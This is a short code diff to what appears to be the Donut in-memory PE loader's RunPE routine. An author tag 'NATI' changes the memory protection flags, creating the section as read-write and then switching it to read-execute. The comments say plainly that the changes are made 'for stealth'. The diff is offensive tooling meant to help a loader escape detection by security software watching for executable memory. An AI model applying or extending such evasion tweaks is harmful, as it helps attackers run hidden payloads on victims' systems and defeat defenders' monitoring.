@@ -28,7 +28,7 @@
   OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
   OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
-
+#include "loader.h"
 #ifdef _WIN64
 #define IMAGE_REL_TYPE IMAGE_REL_BASED_DIR64
 #else
@@ -133,7 +133,12 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
     DPRINT("Creating section to store PE.");
     DPRINT("Requesting section size: %d", nt->OptionalHeader.SizeOfImage);
     if (inst->decoy[0] == 0) {
-      status = inst->api.NtCreateSection(&hSection, SECTION_ALL_ACCESS, 0, &liSectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+
+      //NATI - 08/07/2025
+      // Create section with RW permissions first for stealth
+      status = inst->api.NtCreateSection(&hSection, SECTION_ALL_ACCESS, 0, &liSectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
+      //NATI - 08/07/2025
+      
       DPRINT("NTSTATUS: %d", status);
       if(status != 0) return;
     } else {
@@ -423,11 +428,12 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
       DPRINT("Mapped to address: %p", cs);
     }
 
-    // start everything out as WC
-    // this is because some sections are padded and you can end up with extra RWX memory if you don't pre-mark the padding as WC
-    DPRINT("Pre-marking module as WC to avoid padding between PE sections staying RWX.")
-    inst->api.VirtualProtect(cs, viewSize, PAGE_WRITECOPY, &oldprot);
-
+    //NATI - 08/07/2025 
+    // After copying and relocations, change to RX before execution
+    DPRINT("Setting section to RX before execution for stealth.");
+    inst->api.VirtualProtect(cs, viewSize, PAGE_EXECUTE_READ, &oldprot);
+    //NATI - 08/07/2025 
+    
     DPRINT("Setting permissions for each PE section");
     // done with binary manipulation, mark section permissions appropriately
     for (i = 0; i < ntc.FileHeader.NumberOfSections; i++)
